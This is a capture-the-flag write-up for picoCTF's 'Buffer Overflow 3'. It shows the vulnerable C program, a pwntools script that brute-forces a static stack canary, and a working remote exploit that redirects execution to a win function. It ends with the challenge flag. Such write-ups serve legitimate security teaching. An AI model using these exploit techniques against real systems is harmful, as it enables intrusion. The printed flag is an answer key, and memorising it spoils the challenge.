# Buffer Overflow 3
 
Again, a buffer overflow to a win function, but now with a *static* canary.

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

Reading the program, it places a canary onto the stack, based on what's in the file, after asking how long your message is. The length of the message doesn't matter, since the length can be more than the buffer size.

After a bit of trial and error, the furthest we can go without overwriting the stack canary is `64` characters. From here, we can brute force the canary.

Assuming the canary is only comprised of characters, we can simply try every character until one works. The list of characters is:
`abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`

Now, our program to brute force the canary (using process as our testing file):

```python
from pwn import *

inputs = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
canary = ""

for i in range(4):
	for i in range(len(inputs)):
		c = process("./vuln")
		payload = "a" * 64
		payload += canary
		payload += inputs[i]
		c.sendline(str(len(payload)))
		c.sendline(payload)
		line = c.readline()
		line = c.readline()
		if "*" not in line:
			canary += inputs[i]
			break

print(canary)
```

When running this on the server, you get the canary `BiRd`

We then put this into our program, and a bit of debugging using gdb, we get this program:

```python
from pwn import *

inputs = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

c = remote("saturn.picoctf.net", 51126)


payload = "a" * 64
payload += "BiRd"
payload += "c" * 16
payload += p32(0x08049336)
c.sendline(str(len(payload)))

c.sendline(payload)
c.interactive()
```

This nets us our flag: `picoCTF{Stat1C_c4n4r13s_4R3_b4D_9602b3a1}`

(which they are!)